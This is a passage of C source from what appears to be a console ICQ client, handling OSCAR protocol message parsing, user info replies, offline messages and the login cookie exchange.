                    msg->typeFlags |= MFLAGTYPE_UCS2BE;
                }
                bsReadToString(bsd, msg->data, msgLen);
                break;

            default:
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
    }

    if (msgLen > 0)
    {
        /* only normal messages come in type1 */
        YSM_ReceiveMessageData(msg);
    }
}

/* This function can be called from DC PEER_MSGs as well as from
 * ReceiveMessageType2() since the main type2 message body is
 * the same for both. If dc_flag is TRUE, it was called from DC.
 */

int32_t YSM_ReceiveMessageType2Common(bsd_t bsd, msg_t *msg)
{
    int8_t      *pguid = NULL;
    msg_type_t  msgType = YSM_MESSAGE_UNDEF;
    uint16_t    msgStatus = 0;
    uint16_t    msgPriority = 0;
    uint16_t    msgLen = 0;
    uint32_t    guidLen = 0;
    int32_t     ret = TRUE;
    string_t   *guidStr = NULL;

    DEBUG_PRINT("");

    bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR);  /* Some Length     */
    bsReadWordLE(bsd, &msg->seq);
    bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR);  /* SEQ2            */
    bsSeek(bsd, 12, BS_SEEK_CUR);           /* Unknown         */

    bsReadByte(bsd, (uint8_t *)&msg->type);
    bsReadByte(bsd, (uint8_t *)&msg->flags);
    bsReadWordLE(bsd, &msgStatus);
    bsReadWordLE(bsd, &msgPriority);
    bsReadWordLE(bsd, &msgLen);

    /* empty messages sent by icq 2002/2001 clients are ignored */
    if (msgLen <= 0x1 && msgPriority == 0x2)
    {
        return ret;
    }

    bsReadToString(bsd, msg->data, msgLen);

    /* after the message data, there might be a GUID identifying
     * the type of encoding the sent message is in.
     * if the message type is a MESSAGE, GUIDs come after
     * 8 bytes of colors (fg(4) + bg(4))
     */

    if (msg->type == YSM_MESSAGE_NORMAL)
    {
        bsSeek(bsd, SIZEOF_DWORD*2, BS_SEEK_CUR);
        bsReadDwordLE(bsd, &guidLen);

        if (guidLen == sizeof(CAP_UTF8_GUID))    /* size of the UTF8 GUID */
        {
            guidStr = initString();
            bsReadToString(bsd, guidStr, guidLen);

            if (!memcmp(getString(guidStr), CAP_UTF8_GUID, sizeof(CAP_UTF8_GUID)))
            {
                msg->flags |= MFLAGTYPE_UTF8;
            }
        }
    }
    /* m_status in type2 messages depending on the message subtype
     * will be the user'status or the message status.
     */

    ret = YSM_ReceiveMessageData(msg);

    return ret;
}

void YSM_ReceiveMessageType2(bsd_t bsd, msg_t *msg)
{
    int16_t  tmplen = 0, cmd = 0;
    uint16_t msgLen = 0;
    int8_t   foundtlv = FALSE, m_type[4];
    tlv_t    tlv5;
    tlv_t    tlv;
    bs_pos_t pos;
    bs_pos_t eod;

    bsReadTlv(bsd, &tlv5);
    if (tlv5.type != 0x5)
        return;

    eod = bsTell(bsd) + tlv.len;

    /* Skip the first 0x5 TLV */
    bsReadWord(bsd, &cmd);

    /* ACK TYPE */
    /* 0x0000 -> Text Message    */
    /* 0x0001 -> Abort Request    */
    /* 0x0002 -> File ACK        */

    switch (cmd)
    {
        case 0x0000:
            msg->typeFlags |= MFLAGTYPE_NORM;
            break;

        case 0x0001:
            msg->typeFlags |= MFLAGTYPE_END;
            break;

        case 0x0002:
            msg->typeFlags |= MFLAGTYPE_ACK;
            break;

        default:
            printfOutput(VERBOSE_MOATA,
                    "ReceiveMessageType2: unknown cmd(%d).\n",
                    cmd);
            return;
    }

    bsSeek(bsd,
            8 +        /* timestamp + random msg id */
            16,        /* capabilities */
            BS_SEEK_CUR);

    /* to have a limit in case anything happends */
    while (!foundtlv && bsTell(bsd) < eod)
    {
        bsReadTlv(bsd, &tlv);
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            case 0x2711:       /* Message C TLV  */
                bsSeek(bsd,
                        2 +    /* len till SEQ1  */
                        2 +    /* TCP Version #  */
                        16 +   /* Capabilities   */
                        9,     /* Unknown        */
                        BS_SEEK_CUR);

                foundtlv = TRUE;
                break;

            case 0x3:
            case 0x5:
            case 0x4:
            default:
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
    }

    /* No boy, get out now */
    if (!foundtlv) return;

    if (YSM_ReceiveMessageType2Common(bsd, msg) > 0)
        sendAckType2(msg);
}

void YSM_ReceiveMessageType4(bsd_t bsd, msg_t *msg)
{
    uint16_t msgLen = 0;
    tlv_t    tlv5;
    uin_t    yetAnotherUin;

    DEBUG_PRINT("");

    bsReadTlv(bsd, &tlv5);

    if (tlv5.type != 0x5)
        return;

    bsReadDwordLE(bsd, &yetAnotherUin);

    if (yetAnotherUin != msg->sender->uin)
    {
        DEBUG_PRINT("uins are not equal (%ld != %ld)",
                msg->sender->uin, yetAnotherUin);
    }

    bsReadByte(bsd, (uint8_t *)&msg->type);
    bsReadByte(bsd, (uint8_t *)&msg->flags);
    bsReadWordLE(bsd, &msgLen);
    bsReadToString(bsd, msg->data, msgLen);
    YSM_ReceiveMessageData(msg);
}

static void receiveMessage(flap_head_t *flap, bsd_t bsd)
{
    uint16_t     warnLevel;
    uint16_t     tlvCount;
    uint16_t     msgChannel;
    uin_t        uin;
    int8_t      *strUin = NULL;
    int8_t       uinLen = 0;
    tlv_t        tlv;
    bs_pos_t     pos;
    msg_t        msg;
    slave_t      anonymous;

    DEBUG_PRINT("");
    memset((void *)&msg, 0, sizeof(msg));
    msg.data = initString();

    bsRead(bsd, msg.id, sizeof(msg.id));
    bsReadWord(bsd, &msgChannel);
    bsReadByte(bsd, &uinLen);

    strUin = YSM_CALLOC(1, uinLen+1);
    if (!strUin || uinLen+1 < 1) return;

    bsRead(bsd, strUin, uinLen);
    uin = atol(strUin);
    YSM_FREE(strUin);

    bsReadWord(bsd, &warnLevel);
    bsReadWord(bsd, &tlvCount);

    lockSlaveList();

    msg.sender = getSlaveByUin(uin);

    if (msg.sender == NULL)
    {
        memset(&anonymous, '\0', sizeof(anonymous));
        anonymous.uin = uin;
        anonymous.reqId = -1; /* TODO: define value!!! */
        msg.sender = &anonymous;
    }

    /* When there is no data, we just get a single TLV */
    /* to avoid any problems, we analyze the packet right now */

    if (tlvCount == 0)
    {
        /* weird it is..but it seems WWP messages sent through icq.com carry not TLVs..
         * we'll make a sanity check anyway only allowing messages type 4..
         */
        if (msgChannel == 0x4)
        {
            YSM_ReceiveMessageType4(bsd, &msg);
        }
        if (msg.data != NULL)
            freeString(msg.data);
        return;
    }

    for (; tlvCount > 0 && bsReadTlv(bsd, &tlv) == SIZEOF_TLV_HEAD; tlvCount--)
    {
        pos = bsTell(bsd);

        switch (tlv.type)
        {
            case 0x06:      /* senders status */
                bsReadWord(bsd, (uint16_t *)&msg.statusFlags);
                bsReadWord(bsd, (uint16_t *)&msg.status);
                break;

            case 0x03:      /* user login timestamp */
            case 0x13:      /* no idea what this is, just yet */
            default:
                break;
        }

        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
    }

    DEBUG_PRINT("uin = %ld", uin);

    switch (msgChannel)
    {
        case 0x1:    /* Normal Msg. */
            YSM_ReceiveMessageType1(bsd, &msg);
            break;

        case 0x2:    /* Complex Msg, yack! */
            YSM_ReceiveMessageType2(bsd, &msg);
            break;

        case 0x4:    /* Utility Msg. */
            YSM_ReceiveMessageType4(bsd, &msg);
            break;

        default:
            printfOutput(VERBOSE_MOATA,
                    "INFO DEBUG Unknown type (0x%.2X) received\n",
                    msgChannel);
            break;
    }

    if (msg.data != NULL)
        freeString(msg.data);

    unlockSlaveList();
}

void incomingPersonal(flap_head_t *head, bsd_t bsd)
{
    uint8_t   len = 0;
    int32_t   remainLen = 0;
    tlv_t     tlv;
    bs_pos_t  nextTlvPos;

    /* uin len */
    bsReadByte(bsd, &len);
    bsSeek(bsd, len, BS_SEEK_CUR);
    bsSeek(bsd, SIZEOF_DWORD, BS_SEEK_CUR);

    remainLen = head->len - SIZEOF_SNAC_HEAD;

    while (remainLen > 0)
    {
        bsReadTlv(bsd, &tlv);
        nextTlvPos = bsTell(bsd) + tlv.len;
        remainLen -= tlv.len + SIZEOF_TLV_HEAD;

        /* buf should point to the TLV type field. */
        switch (tlv.type)
        {
            case 0x3:
                if (tlv.len == 0x4)
                {
                    bsReadWord(bsd, (uint16_t *)&g_model.timing.signOn);
                }
                break;

            case 0xA:
                /* get our external ip address */
                bsReadDwordLE(bsd, &g_model.dc.rIP_ext);

            default:
                break;
        }

        bsSeek(bsd, nextTlvPos, BS_SEEK_SET);
    }

    g_model.delta = g_model.timing.signOn - time(NULL);
    if (g_model.delta < 0)
        g_model.delta = 0;
}

static void incomingMainInfo(bsd_t bsd, uint32_t reqId)
{
    string_t    *str = NULL;
    bool_t      local = FALSE;
//    slave_t *victim = {SLAVE_HND_FIND, uin};

    /* local is true if its ours */
    local = (reqId == (g_model.uin & 0xffffff7f));

    /* first LNTS is NICK */
    str = initString();
    bsReadString16(bsd, str);
    DEBUG_PRINT("data: %s", getString(str));

#if 0
    /* Update nicknames ? */
    if (local || g_cfg.updateNicks > 0)
    {
        /* using strcmp here, to update even low/big caps */
        if (strlen(getString(str)) > 1 && strcmp(pnick, data))
        {
            if (parseSlave(data))
            {
                if (local)
                {
                    strncpy(g_model.user.nick, getString(str), MAX_NICK_LEN-1);
                    g_model.user.nick[MAX_NICK_LEN - 1] = '\0';
                }
                else
                    setSlaveNick(&victim, str);
            }
        }
    }

    printfOutput(VERBOSE_BASE,
            "\r%-15.15s" " : %-12.12s ",
            "Nickname",     
            YSM_CharsetConvertOutputString(&data, 1));
#endif

#if 0
    /* Next LNTS is.firstName */
    bsReadString16(bsd, str);

    if (pfirst)
    {
        strncpy( pfirst, data, MAX_NICK_LEN-1 );
        pfirst[MAX_NICK_LEN - 1] = '\0';
    }

    printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "Firstname",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    if (plast)
    {
        strncpy(plast, data, MAX_NICK_LEN-1);
        plast[MAX_NICK_LEN-1] = '\0';
    }

    printfOutput(VERBOSE_BASE,
            "%-15.15s" " : %-12.12s ",
            "Lastname",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    if (pemail) {
        strncpy( pemail, data, MAX_NICK_LEN-1 );
        pemail[MAX_NICK_LEN - 1] = '\0';
    }

    printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "E-mail",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    printfOutput(VERBOSE_BASE,
            "\r%-15.15s" " : %-12.12s ",
            "City",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "State",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    printfOutput(VERBOSE_BASE,
            "\r%-15.15s" " : %-12.12s ",
            "Phone",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "FAX",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    printfOutput(VERBOSE_BASE,
            "\r%-15.15s" " : %-12.12s ",
            "Street",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    bsReadString16(bsd, str);

#if 0
    printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "Cellular",
            YSM_CharsetConvertOutputString(&data, 1));
#endif

    freeString(str);
}

void incomingHPInfo(bsd_t bsd)
{
#if 0
    printfOutput(VERBOSE_BASE,
            "%-15.15s" " : %-12.u ",
            "Age",
            buf[tsize] );

    if (buf[tsize+2] != 0)
    {
        printfOutput(VERBOSE_BASE,
                "%-20.20s" " : %s\n",
                "Sex",
                (buf[tsize+2] == 0x02) ? "Male." : "Female.");
    }
#endif
}

void YSM_IncomingWorkInfo(int8_t *buf, int32_t tsize)
{
    uint8_t *data = NULL;
    int32_t  nlen = 0;

    if (buf == NULL)
        return;

    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    printfOutput(VERBOSE_BASE,
            "\r%-15.15s" " : %-12.12s ",
            "City",
            YSM_CharsetConvertOutputString(&data, 1));

    YSM_FREE(data);

    tsize += nlen;
    nlen = Chars_2_Word(buf+tsize);
    tsize += 2;
    data = YSM_CALLOC(1, nlen+1);
    memcpy(data, buf+tsize, nlen);

    printfOutput(VERBOSE_BASE,
            "%-20.20s" " : %s\n",
            "State",
            YSM_CharsetConvertOutputString(&data, 1));

    YSM_FREE(data);
}

void incomingAboutInfo(bsd_t bsd)
{
    uint8_t *data = NULL;
    int16_t  len = 0;

    bsReadWord(bsd, &len);

    if ((data = YSM_CALLOC(1, len+1)) != NULL)
    {
        bsRead(bsd, data, len);

#if 0
        printfOutput(VERBOSE_BASE,
                "\r\n%-15.15s" " : \n%s\n",
                "About",
                YSM_CharsetConvertOutputString(&data, 1));
#endif

        YSM_FREE(data);
    }
}

void incomingInfo(bsd_t bsd, uint8_t type, req_id_t reqId)
{
    switch (type)
    {
        case INFO_MAIN:
            incomingMainInfo(bsd, reqId);
            break;

        case INFO_HP:
            incomingHPInfo(bsd);
            break;

        case INFO_WORK:
#if 0
            /* we disabled work info since we decided
             * it is a waste of screen space to display it
             */
            YSM_IncomingWorkInfo(buf, tsize);
#endif
            break;

        case INFO_ABOUT:
            incomingAboutInfo(bsd);
            break;

        default:
            break;
    }
}

void incomingSearch(bsd_t bsd)
{
    char      *data = NULL;
    uint16_t   dataLen = 0;
    uin_t      uin = 0;

    bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR); /* skip record LEN */
    bsReadDword(bsd, &uin);

    bsReadWord(bsd, &dataLen);
    if ((data = YSM_CALLOC(1, dataLen+1)) != NULL)
    {
        bsRead(bsd, data, dataLen);
        printfOutput(VERBOSE_BASE, "INFO SEARCH %ld %s\n", uin, data);
        YSM_FREE(data);
    }
}


void incomingMultiUse(flap_head_t *head, snac_head_t *snac, bsd_t bsd)
{
    uint16_t   dataLen = 0;
    uint16_t   reqId;
    uint16_t   rspType;
    uint16_t   rspSubType;
    int8_t     result;
    tlv_t      tlv;

    DEBUG_PRINT("");

    /* its a TLV(1) at the very beggining, always. */
    bsReadTlv(bsd, &tlv);
    bsReadWord(bsd, &dataLen);

    bsSeek(bsd, SIZEOF_DWORD, BS_SEEK_CUR); /* skip my UIN */
    bsReadWordLE(bsd, &rspType);
    bsReadWordLE(bsd, &reqId);

    switch (rspType)
    {
        /* Information request response */
        case 0x07DA:
            bsReadWordLE(bsd, &rspSubType);
            bsReadByte(bsd, &result);

            if (result != 0x32 && result != 0x14 && result != 0x1E)
            {
                switch (rspSubType)
                {
                    /* Incoming MAIN info */
                    case 0xC8:
                        incomingInfo(bsd, INFO_MAIN, snac->reqId);
                        break;

                        /* incoming full info */
                    case 0xDC:
                        incomingInfo(bsd, INFO_HP, snac->reqId);
                        break;

                    case 0xD2:
                        incomingInfo(bsd, INFO_WORK, snac->reqId);
                        break;

                    case 0xE6:
                        incomingInfo(bsd, INFO_ABOUT, snac->reqId);
                        break;

                    case 0xA4:
                    case 0xAE:
                        incomingSearch(bsd);
                        break;

                    case 0x64:
                        printfOutput(VERBOSE_BASE, "INFO " MSG_INFO_UPDATED "\n");
                        break;

                    case 0xAA:
                        printfOutput(VERBOSE_BASE, "INFO Password changed.\n");
                        break;

                    default:
                        break;
                }
            }
            break;

        /* offline message response */
        case 0x0041:
        {
            msg_t     msg;
            slave_t   strg;
            uin_t     uin = 0;
            int8_t    o_month = 0, o_day = 0, o_hour = 0, o_minutes = 0;

            msg.data = initString();

            bsReadDwordLE(bsd, &uin);               /* uin LE */
            bsSeek(bsd, SIZEOF_WORD, BS_SEEK_CUR);  /* skip WORD (year) */
            bsReadByte(bsd, &o_month);              /* month */
            bsReadByte(bsd, &o_day);                /* day */
            bsReadByte(bsd, &o_hour);               /* hour */
            bsReadByte(bsd, &o_minutes);            /* minutes */
            bsReadByte(bsd, (uint8_t *)&msg.type);  /* message type */
            bsReadByte(bsd, (uint8_t *)&msg.flags); /* message flags */
            bsReadString16(bsd, msg.data);          /* message string16 */

            if (!(msg.sender = getSlaveByUin(uin)))
            {
                initStranger(&strg, uin);
                msg.sender = &strg;
            }

            printfOutput(VERBOSE_BASE,
                    "\n" MSG_NEW_OFFLINE "\n"
                    "[date: %.2d/%.2d time: %.2d:%.2d (GMT):\n",
                    o_day,
                    o_month,
                    o_hour,
                    o_minutes);

            /* offline message */
            YSM_ReceiveMessageData(&msg);

            freeString(msg.data);
            break;
        }

        case 0x0042:
            sendDeleteOfflineMsgsReq();
            break;

        default:
            DEBUG_PRINT("unknown respond type 0x%X!", rspType);
            break;
    }
}

void incomingFlapSnacData(oscar_msg_t *msg)
{
    snac_head_t  snac;
    flap_head_t *head = &msg->flap;
    bsd_t        bsd = msg->bsd;

    static const uint8_t icqCloneIdent[] = {
        0x00,0x01,0x00,0x03,0x00,0x02,0x00,0x01,
        0x00,0x03,0x00,0x01,0x00,0x15,0x00,0x01,
        0x00,0x04,0x00,0x01,0x00,0x06,0x00,0x01,
        0x00,0x09,0x00,0x01,0x00,0x0A,0x00,0x01,
    };

    bsReadSnacHead(bsd, &snac);

    printfOutput(VERBOSE_MOATA,
            "SNAC id 0x%.2X and sub 0x%.2X\n", snac.familyId, snac.subTypeId);

    switch (snac.familyId)
    {
        case YSM_BASIC_SERVICE_SNAC:
            DEBUG_PRINT("Basic Service SNAC arrived!");

            switch (snac.subTypeId)
            {
                case YSM_SERVER_IS_READY:
                    printfOutput(VERBOSE_MOATA,
                            "Server Ready. Notifying the "
                            "server that we are an ICQ client\n");

                    sendSnac(0x1, 0x17, 0x0,
                            icqCloneIdent,
                            sizeof(icqCloneIdent),
                            head->seq,
                            0);
                    break;

                case YSM_ACK_ICQ_CLIENT:
                    YSM_RequestRates();
                    break;

                case YSM_RATE_INFO_RESP:
                    /* Just an ACK that we received the rates */
                    sendSnac(0x1, 0x08, 0x0,
                            Rates_Acknowledge,
                            sizeof(Rates_Acknowledge),
                            g_sinfo.seqnum++,
                            0);

                    /* ICBM, CAPABILITES, YOU NAME IT! */
                    sendICBMRightsReq();
                    sendBuddyRightsReq();
                    /* Request Personal */
                    YSM_RequestPersonal();
                    break;

                    /* This is either a status change Acknowledge
                     * Or a personal information reply.
                     * We check its request ID to be 0x000E as sent
                     * in the first request. If so, proceed with
                     * the startup. Else, it's a status change. */

                    /* case YSM_SCREEN_INFO_RESP: same thing */
                case YSM_STATUS_CHANGE_ACK:
                    if (snac.reqId == 0xE000000 || snac.reqId == 0x000000E)
                    {
                        incomingPersonal(head, bsd);
                        sendCapabilities();

                        /* If we have no slaves we would */
                        /* be sending an empty packet. */
                        if (getSlavesListLen() > 0)
                            YSM_SendContacts();

                        sendIcbmParams();

                        if (g_model.status != STATUS_INVISIBLE)
                        {
                            changeStatus(g_model.status);
                        }

                        /* SET US AS READY */
                        sendCliReady();
                        sendCheckContactsReq();
                        sendOfflineMsgsReq();
                    }
                    else
                        printfOutput(VERBOSE_MOATA,
                                "Status Changed\n");
                    break;

                default:
                    break;
            }
            break;

        case YSM_MESSAGING_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_MESSAGE_TO_CLIENT:
                    receiveMessage(head, bsd);
                    break;

                case YSM_MESSAGE_FROM_CLIENT:
                    break;

                case YSM_CLIENT_ACK:
                    incomingClientAck(head, bsd);
                    break;

                case YSM_HOST_ACK:    /* just a srv ack */
                    /* call Incoming_Scan if we were waiting
                     * a reply from a previous scan.
                     */

                    if (0 != g_sinfo.scanqueue)
                        incomingScanRsp(&snac);

                    break;

                case YSM_SRV_MISSED_CALLS:
                    printfOutput(VERBOSE_MOATA,
                            "\n" MSG_AOL_WARNING );
                    break;

                case YSM_CLI_SRV_ERRORMSG:
                    /* We used to have lots of 0x1 subtypes */
                    /* printf's on the screen big mistake! not */
                    /* all of the error-codes are known and */
                    /* they still are useless for us. Plus, no */
                    /* printf's of %s now. Most of these errors */
                    /* are caused by really sucking features of */
                    /* the new-era icq clients, such as plugins. */

                    /* We want this for our WAR mode, */
                    /* undocumented of course ;)  for not wasting */
                    /* time searching in the slaves list, use a */
                    /* global flag, yak :( */

                    if (0 != g_sinfo.scanqueue)
                        incomingScanRsp(&snac);

                    break;

                    /* Dont bother the user with new subtypes arriving */
                default:
                    break;
            }
            break;

        case YSM_BUDDY_LIST_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_SRV_ONCOMING_BUD:
                case YSM_SRV_OFFGOING_BUD:
                    YSM_BuddyChangeStatus(&snac, bsd);
                    break;

                case YSM_SRV_REJECT_NOTICE:
                    /* woha this seems serious..mama mia. */
                    break;

                case YSM_SRV_RIGHTS_INFO:
                    /* reply to rights request, just */
                    /* we wont care about the data */
                    break;

                default:
                    printfOutput(VERBOSE_MOATA,
                            "\n[ERR]:  Unknown subtype"
                            ": %x - in Buddy List SNAC\n",
                            snac.subTypeId);
                    break;
            }
            break;

        case YSM_MULTIUSE_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_SRV_SEND_RSP:
                    incomingMultiUse(head, &snac, bsd);
                    break;

                default:
                    break;
            }
            break;

        case YSM_ICQV8FUNC_SNAC:
            switch (snac.subTypeId)
            {
                case YSM_SRV_SEND_ROSTER:
                    YSM_BuddyIncomingList(bsd);
                    YSM_SendContacts();
                    break;

                case YSM_SRV_ROSTER_OK:
                    break;

                case YSM_SRV_CHANGE_ACK:
                    YSM_BuddyIncomingChange(&snac, bsd);
                    break;

                default:
                    break;
            }
            break;

        case YSM_REGISTRATION_SNAC:
            break;

        default:
            break;
    }
}

void incomingFlapCloseConnection(oscar_msg_t *msg)
{
    uint8_t       *a = NULL;
    uint8_t       *buf = NULL;
    uint8_t       *cookie = NULL;
    uint16_t       cookieLen = 0;
    uint16_t       errorCode;
    tlv_t          tlv;
    bs_pos_t       pos;
    bsd_t          bsd = msg->bsd;

    DEBUG_PRINT("");

    while (bsReadTlv(bsd, &tlv) == SIZEOF_TLV_HEAD)
    {
        pos = bsTell(bsd);

        DEBUG_PRINT("tlv.type: %x, tlv.len: %d", tlv.type, tlv.len);

        switch (tlv.type)
        {
            /* Check if someone else disconnected us
             * by logging in with our UIN # */
            case 0x9:
                printfOutput(VERBOSE_BASE, MSG_ERR_SAMEUIN, "\n");
                printfOutput(VERBOSE_BASE,
                        "\n" MSG_ERR_DISCONNECTED "\n");
                break;

            case 0x1:  /* skip our UIN */
            case 0x4:  /* skip the error description url */
            case 0x8E: /* reply from server */
                break;

            case 0x5:  /* BOS-address:port */
                if (buf = YSM_MALLOC(tlv.len))
                {
                    bsRead(bsd, buf, tlv.len);
                    if ((a = memchr(buf, ':', tlv.len)) == NULL)
                    {
                        YSM_FREE(buf);
                        break;
                    }

                    *a = '\0';
                    a++;

                    memset(g_model.network.cookieHost, '\0', MAX_PATH);
                    strncpy(g_model.network.cookieHost,
                            buf,
                            sizeof(g_model.network.cookieHost) - 1);

                    /* 5190 is default */
                    g_model.network.cookiePort = (uint16_t)strtol(a, NULL, 10);
                    YSM_FREE(buf);
                }
                break;

            case 0x6:    /* Cookie is here..hmmm ..comida ;) */
                if (cookie = YSM_MALLOC(tlv.len))
                {
                    bsRead(bsd, cookie, tlv.len);
                    cookieLen = tlv.len;
                }
                break;

            case 0xC:
                printfOutput(VERBOSE_BASE, "DISCONNECTED unknown error");
                break;

            case 0x8:
                bsReadWord(bsd, &errorCode);

                switch (errorCode)
                {
                    case 0x1:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x4:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVPASSWD, "\n");
                        break;

                    case 0x5:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVPASSWD, "\n");
                        break;

                    case 0x7:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x8:
                        printfOutput(VERBOSE_BASE, MSG_ERR_INVUIN, "\n");
                        break;

                    case 0x15:
                        printfOutput(VERBOSE_BASE, MSG_ERR_TOOMC, "\n");
                        break;

                    case 0x16:
                        printfOutput(VERBOSE_BASE, MSG_ERR_TOOMC, "\n");
                        break;

                    case 0x18:
                        printfOutput(VERBOSE_BASE, MSG_ERR_RATE, "\n");
                        break;
                }

                printfOutput(VERBOSE_BASE, "\n" MSG_ERR_DISCONNECTED "\n");
                break;

            default:
                DEBUG_PRINT("Unknown TLV type Ox%X", tlv.type);
                break;
        }

        DEBUG_PRINT("");
        bsSeek(bsd, pos + tlv.len, BS_SEEK_SET);
        DEBUG_PRINT("");
    }

    g_state.connected = FALSE;
    close(g_model.network.socket);

    if (!(g_sinfo.flags & FL_LOGGEDIN) && a != NULL && cookie != NULL)
    {
        /* server sends BOS address and cookie, so we can continue 
         * login sequence */

        g_model.network.socket = YSM_Connect(
                g_model.network.cookieHost,
                g_model.network.cookiePort,
                0x1);

        if (g_model.network.socket < 0)
            YSM_ERROR(ERROR_NETWORK, 1);

        /* Generemos nuestro Seq random primario */
        srand((unsigned int)time(NULL));
        g_sinfo.seqnum = rand() % 0xffff;

        /* send cookie to BOS */
        loginSendCookie(cookie, cookieLen);
        YSM_FREE(cookie);

        g_state.connected = TRUE;
        g_sinfo.flags |= FL_LOGGEDIN;

        printfOutput(VERBOSE_BASE, "INFO LOGIN_OK\n");
    }
}

/* LoginSequence takes care of logging in to the Authentication
 * server, getting the cookie, and logging in to the BOS server.
 */
#if 0
int32_t YSM_LoginSequence(uin_t uin, int8_t *password)
{
    uint32_t    datasize = 0, pos = 0;
    int32_t      r = 0;
    int8_t      *data = NULL, suin[MAX_UIN_LEN+1], *buf = NULL;
    tlv_bit_t        thetlv;
    snac_head_t    snac;
    flap_head_bit_t    head;

    /* First send a 17,6 SNAC. This way, we request a random
     * key from the server in order to do an MD5 login.
     */

    snprintf(suin, MAX_UIN_LEN, "%d", (int)uin);
    suin[sizeof(suin) - 1] = 0x00;

    datasize = sizeof(tlv_bit_t) + strlen(suin);    /* screen name */
    datasize += sizeof(tlv_bit_t);        /* unknown */
    datasize += sizeof(tlv_bit_t);        /* unknown */

    data = ysm_calloc(1, datasize, __FILE__, __LINE__);
    memset(&thetlv, 0, sizeof(tlv_bit_t));

    Word_2_Charsb(thetlv.type, 0x1);
    Word_2_Charsb(thetlv.len, strlen(suin));

    memcpy(data+pos, &thetlv, sizeof(tlv_bit_t));
    pos += sizeof(tlv_bit_t);

    memcpy(data+pos, suin, strlen(suin));
    pos += strlen(suin);

    Word_2_Charsb(thetlv.type, 0x4B);
    Word_2_Charsb(thetlv.len, 0x0);

    memcpy(data+pos, &thetlv, sizeof(tlv_bit_t));
    pos += sizeof(tlv_bit_t);

    Word_2_Charsb(thetlv.type, 0x5A);
    Word_2_Charsb(thetlv.len, 0x0);

    memcpy(data+pos, &thetlv, sizeof(tlv_bit_t));
    pos += sizeof(tlv_bit_t);

    if (sendSnac(17, 6, 0x0, data, pos, g_sinfo.seqnum++, 0) < 0)
    {
        return -1;
    }

    YSM_FREE(data);

    /* ok we sent the first SNAC, we have to receive 17, 07
     * as a valid response */

    memset(&head, 0, sizeof(head));

    r = YSM_READ(g_model.network.socket, &head, SIZEOF_FLAP_HEAD, 0);

    if (r < 1 || r != SIZEOF_FLAP_HEAD) return -1;

    buf = YSM_CALLOC(1, Chars_2_Wordb(head.dlen)+1);

    r = YSM_READ(g_model.network.socket,
            buf,
            Chars_2_Wordb(head.dlen),
            0 );

    if (r < 1 || r != Chars_2_Wordb(head.dlen)) return -1;

    readSnac(&snac, buf);

    if (snac.reqId == 0x23) return 1;

    return 0;
}
#endif

void YSM_Init_LoginA(uin_t uin, uint8_t *password)
{
    flap_head_bit_t   head;
    uint8_t    buf[4];
    uint8_t    passwdStr[strlen(password)];
    uint8_t    profile[] = "ICQ Inc. - Product of ICQ (TM).2003a.5.47.1.3800.85";
    uint32_t   distrNum = 0x55;
    uint16_t   clientId = 0x10A;
    uint16_t   majorVer = 0x5;
    uint16_t   minorVer = 0x2F;
    uint16_t   lesserVer = 0x1;
    uint16_t   buildNum = 0x0ED8;
    uint32_t   r = 0;
    bsd_t      bsd;
    bs_pos_t   tlv;
    bs_pos_t   flap;

    DEBUG_PRINT("");

    memset(&head, '\0', sizeof(head));
    memset(buf, '\0', 4);

    r = YSM_READ(g_model.network.socket, &head, SIZEOF_FLAP_HEAD, 1);

    if (r < SIZEOF_FLAP_HEAD) return;

    r = YSM_READ(g_model.network.socket, &buf, sizeof(buf), 1);

    if (r < (int32_t)sizeof(buf)) return;

    /* El server nos manda listo para login en la data 0001 */
    if (!buf[0] && !buf[1] && !buf[2] && buf[3] == 1)
    {
        bsd = initBs();

        flap = bsAppendFlapHead(bsd, head.channelID, BETOH16(head.seq)+1, 0);

        /* We copy the 0001 as reply  */
        bsAppend(bsd, buf, 4);

        /* TLV type 1: screen name (uin) */
        tlv = bsAppendTlv(bsd, 0x1, 0, NULL);
        bsAppendPrintfString(bsd, "%ld", uin);
        bsUpdateTlvLen(bsd, tlv);

        memset(passwdStr, '\0', sizeof(passwdStr));
        EncryptPassword(password, passwdStr);

        /* TLV type 2: roasted password */
        /* roasted password may contains zero bytes so we should use
         * length of plain password */
        bsAppendTlv(bsd, 0x2, strlen(password), passwdStr);

        /* TLV type 3: client id string */
        bsAppendTlv(bsd, 0x3, strlen(profile), profile);

        /* TLV type 16: client id */
        bsAppendTlv(bsd, 0x16, 2, NULL);
        bsAppendWord(bsd, clientId);

        /* TLV type 17: client major version */
        /* major version 4 icq2000 5 icq2001 */
